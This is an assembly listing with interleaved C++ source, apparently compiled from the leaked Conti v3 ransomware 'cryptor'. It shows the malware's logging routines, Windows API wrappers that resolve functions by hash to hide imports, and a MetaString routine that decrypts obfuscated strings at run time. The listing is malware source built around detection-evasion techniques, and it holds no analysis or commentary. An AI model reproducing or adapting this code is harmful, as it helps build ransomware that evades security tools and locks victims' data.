; 51   : 				if (TimeSize) {

  00291	85 c0		 test	 eax, eax
  00293	74 32		 je	 SHORT $LN4@Write

; 52   : 					pWriteFile(g_LogHandle, TimeBuffer, TimeSize * sizeof(WCHAR), &dwWritten, NULL);

  00295	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_LogHandle@@3PEAXEA ; g_LogHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  0029c	ba 0f 00 00 00	 mov	 edx, 15
  002a1	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  002a7	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  002ab	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 52   : 					pWriteFile(g_LogHandle, TimeBuffer, TimeSize * sizeof(WCHAR), &dwWritten, NULL);

  002b0	44 8d 04 1b	 lea	 r8d, DWORD PTR [rbx+rbx]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  002b4	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  002b9	4c 8d 4c 24 68	 lea	 r9, QWORD PTR dwWritten$4[rsp]
  002be	48 8b cf	 mov	 rcx, rdi
  002c1	48 8d 55 80	 lea	 rdx, QWORD PTR TimeBuffer$6[rbp-256]
  002c5	ff d0		 call	 rax
$LN4@Write:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 55   : 				pWriteFile(g_LogHandle, Buffer, Size, &dwWritten, NULL);

  002c7	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_LogHandle@@3PEAXEA ; g_LogHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  002ce	ba 0f 00 00 00	 mov	 edx, 15
  002d3	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  002d9	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  002dd	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  002e2	4c 8d 4c 24 68	 lea	 r9, QWORD PTR dwWritten$4[rsp]
  002e7	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  002ec	44 8b c6	 mov	 r8d, esi
  002ef	48 8d 95 80 00
	00 00		 lea	 rdx, QWORD PTR Buffer$7[rbp-256]
  002f6	48 8b cf	 mov	 rcx, rdi
  002f9	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 56   : 				pWriteFile(g_LogHandle, clrf, 4, &dwWritten, NULL);

  002fb	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_LogHandle@@3PEAXEA ; g_LogHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  00302	ba 0f 00 00 00	 mov	 edx, 15
  00307	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  0030d	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  00311	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  00316	4c 8d 4c 24 68	 lea	 r9, QWORD PTR dwWritten$4[rsp]
  0031b	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  00320	41 b8 04 00 00
	00		 mov	 r8d, 4
  00326	48 8d 54 24 31	 lea	 rdx, QWORD PTR $T1[rsp+1]
  0032b	48 8b cf	 mov	 rcx, rdi
  0032e	ff d0		 call	 rax

; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00330	ba 0f 00 00 00	 mov	 edx, 15
  00335	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  0033b	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
  0033f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  00344	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A ; g_CritSec
  0034b	ff d0		 call	 rax
$LN147@Write:
  0034d	48 8b bc 24 98
	09 00 00	 mov	 rdi, QWORD PTR [rsp+2456]
  00355	48 8b b4 24 a0
	09 00 00	 mov	 rsi, QWORD PTR [rsp+2464]
  0035d	4c 8b b4 24 90
	09 00 00	 mov	 r14, QWORD PTR [rsp+2448]
$LN3@Write:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 64   : }

  00365	48 8b 8d 80 08
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  0036c	48 33 cc	 xor	 rcx, rsp
  0036f	e8 00 00 00 00	 call	 __security_check_cookie
  00374	48 81 c4 a8 09
	00 00		 add	 rsp, 2472		; 000009a8H
  0037b	5b		 pop	 rbx
  0037c	5d		 pop	 rbp
  0037d	c3		 ret	 0
?Write@logs@@YAXPEB_WZZ ENDP				; logs::Write
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
lpCriticalSection$ = 48
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pEnterCriticalSection, COMDAT

; 394  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 395  : 	VOID(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 396  : 	pFunction = (VOID(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x4f2c3749, 76);//GetProcAddress(hKernel32, OBFA("EnterCriticalSection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 49 37 2c
	4f		 mov	 r8d, 1328297801		; 4f2c3749H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 3d	 lea	 r9d, QWORD PTR [rdx+61]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 397  : 	return pFunction(lpCriticalSection);

  0001d	48 8b cb	 mov	 rcx, rbx

; 398  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 397  : 	return pFunction(lpCriticalSection);

  00025	48 ff e0	 rex_jmp rax
?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pEnterCriticalSection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
lpCriticalSection$ = 48
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pLeaveCriticalSection, COMDAT

; 412  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 413  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 414  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x992c0884, 74);//GetProcAddress(hKernel32, OBFA("LeaveCriticalSection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 84 08 2c
	99		 mov	 r8d, -1725167484	; 992c0884H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 3b	 lea	 r9d, QWORD PTR [rdx+59]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 415  : 	return pFunction(lpCriticalSection);

  0001d	48 8b cb	 mov	 rcx, rbx

; 416  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 415  : 	return pFunction(lpCriticalSection);

  00025	48 ff e0	 rex_jmp rax
?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pLeaveCriticalSection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z
_TEXT	SEGMENT
lpCriticalSection$ = 48
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z PROC ; pInitializeCriticalSection, COMDAT

; 421  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 422  : 	void(WINAPI * pFunction)(LPCRITICAL_SECTION);
; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  0001d	48 8b cb	 mov	 rcx, rbx

; 425  : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 424  : 	return pFunction(lpCriticalSection);

  00025	48 ff e0	 rex_jmp rax
?pInitializeCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ENDP ; pInitializeCriticalSection
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSetFilePointer@@YAKPEAXJPEAJK@Z
_TEXT	SEGMENT
hFile$dead$ = 48
lDistanceToMove$dead$ = 56
lpDistanceToMoveHigh$dead$ = 64
dwMoveMethod$dead$ = 72
?pSetFilePointer@@YAKPEAXJPEAJK@Z PROC			; pSetFilePointer, COMDAT

; 1075 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_LogHandle@@3PEAXEA ; g_LogHandle

; 1076 : 	DWORD(WINAPI * pFunction)(HANDLE, LONG, PLONG, DWORD);
; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  0000d	ba 0f 00 00 00	 mov	 edx, 15
  00012	41 b8 8c 3c 10
	29		 mov	 r8d, 688929932		; 29103c8cH
  00018	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  0001c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1078 : 	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

  00021	41 b9 02 00 00
	00		 mov	 r9d, 2
  00027	45 33 c0	 xor	 r8d, r8d
  0002a	33 d2		 xor	 edx, edx
  0002c	48 8b cb	 mov	 rcx, rbx

; 1079 : }

  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5b		 pop	 rbx

; 1078 : 	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

  00034	48 ff e0	 rex_jmp rax
?pSetFilePointer@@YAKPEAXJPEAJK@Z ENDP			; pSetFilePointer
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z
_TEXT	SEGMENT
Buf$ = 48
Format$ = 56
arglist$ = 64
?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z PROC			; pwvsprintfW, COMDAT

; 1089 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 74 24 10	 mov	 QWORD PTR [rsp+16], rsi
  0000a	57		 push	 rdi
  0000b	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000f	48 8b fa	 mov	 rdi, rdx
  00012	49 8b d8	 mov	 rbx, r8

; 1090 : 	int(WINAPI * pFunction)(LPWSTR, LPCWSTR, va_list);
; 1091 : 	pFunction = (int(WINAPI*)(LPWSTR, LPCWSTR, va_list))getapi::GetProcAddressEx2(NULL, USER32_MODULE_ID, 0x5b7a35c4, 16);

  00015	ba 14 00 00 00	 mov	 edx, 20
  0001a	41 b8 c4 35 7a
	5b		 mov	 r8d, 1534735812		; 5b7a35c4H
  00020	48 8b f1	 mov	 rsi, rcx
  00023	44 8d 4a fc	 lea	 r9d, QWORD PTR [rdx-4]
  00027	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1092 : 	return pFunction(Buf, Format, arglist);

  0002c	4c 8b c3	 mov	 r8, rbx
  0002f	48 8b d7	 mov	 rdx, rdi
  00032	48 8b ce	 mov	 rcx, rsi

; 1093 : }

  00035	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0003a	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  0003f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00043	5f		 pop	 rdi

; 1092 : 	return pFunction(Buf, Format, arglist);

  00044	48 ff e0	 rex_jmp rax
?pwvsprintfW@@YAHPEA_WPEB_WPEAD@Z ENDP			; pwvsprintfW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp
;	COMDAT ?Init@logs@@YAXPEB_W@Z
_TEXT	SEGMENT
LogFile$ = 80
?Init@logs@@YAXPEB_W@Z PROC				; logs::Init, COMDAT

; 8    : {

$LN10:
  00000	40 53		 push	 rbx
  00002	48 83 ec 40	 sub	 rsp, 64			; 00000040H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 8    : {

  00011	48 8b d9	 mov	 rbx, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00014	44 8d 4a 3a	 lea	 r9d, QWORD PTR [rdx+58]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 424  : 	return pFunction(lpCriticalSection);

  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CritSec@@3U_RTL_CRITICAL_SECTION@@A ; g_CritSec
  00024	ff d0		 call	 rax

; 174  : 	pFunction = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x017610e8, 97);//GetProcAddress(hKernel32, OBFA("CreateFileW"));

  00026	ba 0f 00 00 00	 mov	 edx, 15
  0002b	41 b8 e8 10 76
	01		 mov	 r8d, 24514792		; 017610e8H
  00031	44 8d 4a 52	 lea	 r9d, QWORD PTR [rdx+82]
  00035	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  0003a	45 33 c9	 xor	 r9d, r9d
  0003d	48 c7 44 24 30
	00 00 00 00	 mov	 QWORD PTR [rsp+48], 0
  00046	c7 44 24 28 00
	00 00 80	 mov	 DWORD PTR [rsp+40], -2147483648 ; 80000000H
  0004e	ba 00 00 00 40	 mov	 edx, 1073741824		; 40000000H
  00053	48 8b cb	 mov	 rcx, rbx
  00056	c7 44 24 20 04
	00 00 00	 mov	 DWORD PTR [rsp+32], 4
  0005e	45 8d 41 01	 lea	 r8d, QWORD PTR [r9+1]
  00062	ff d0		 call	 rax

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00064	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 10   : 	g_LogHandle = pCreateFileW(

  00069	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_LogHandle@@3PEAXEA, rax ; g_LogHandle
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00070	41 b8 8c 3c 10
	29		 mov	 r8d, 688929932		; 29103c8cH

; 175  : 	return pFunction(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);

  00076	48 8b d8	 mov	 rbx, rax

; 1077 : 	pFunction = (DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x29103c8c, 17);

  00079	44 8d 4a 02	 lea	 r9d, QWORD PTR [rdx+2]
  0007d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1078 : 	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

  00082	41 b9 02 00 00
	00		 mov	 r9d, 2
  00088	45 33 c0	 xor	 r8d, r8d
  0008b	33 d2		 xor	 edx, edx
  0008d	48 8b cb	 mov	 rcx, rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\logs\logs.cpp

; 20   : }

  00090	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00094	5b		 pop	 rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1078 : 	return pFunction(hFile, lDistanceToMove, lpDistanceToMoveHigh, dwMoveMethod);

  00095	48 ff e0	 rex_jmp rax
?Init@logs@@YAXPEB_W@Z ENDP				; logs::Init
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 24 00 00
	00		 mov	 r11d, 36		; 00000024H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 1f	 sub	 ecx, 31

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BP@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<31,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3a	 mov	 BYTE PTR [rcx+1], 58	; 0000003aH
  00007	c6 41 02 1f	 mov	 BYTE PTR [rcx+2], 31
  0000b	c6 41 03 23	 mov	 BYTE PTR [rcx+3], 35	; 00000023H
  0000f	c6 41 04 1f	 mov	 BYTE PTR [rcx+4], 31
  00013	c6 41 05 7a	 mov	 BYTE PTR [rcx+5], 122	; 0000007aH
  00017	c6 41 06 1f	 mov	 BYTE PTR [rcx+6], 31
  0001b	c6 41 07 39	 mov	 BYTE PTR [rcx+7], 57	; 00000039H
  0001f	c6 41 08 1f	 mov	 BYTE PTR [rcx+8], 31
  00023	c6 41 09 53	 mov	 BYTE PTR [rcx+9], 83	; 00000053H
  00027	c6 41 0a 1f	 mov	 BYTE PTR [rcx+10], 31
  0002b	c6 41 0b 33	 mov	 BYTE PTR [rcx+11], 51	; 00000033H
  0002f	c6 41 0c 1f	 mov	 BYTE PTR [rcx+12], 31
  00033	c6 41 0d 23	 mov	 BYTE PTR [rcx+13], 35	; 00000023H
  00037	c6 41 0e 1f	 mov	 BYTE PTR [rcx+14], 31
  0003b	c6 41 0f 7a	 mov	 BYTE PTR [rcx+15], 122	; 0000007aH
  0003f	c6 41 10 1f	 mov	 BYTE PTR [rcx+16], 31
  00043	c6 41 11 39	 mov	 BYTE PTR [rcx+17], 57	; 00000039H
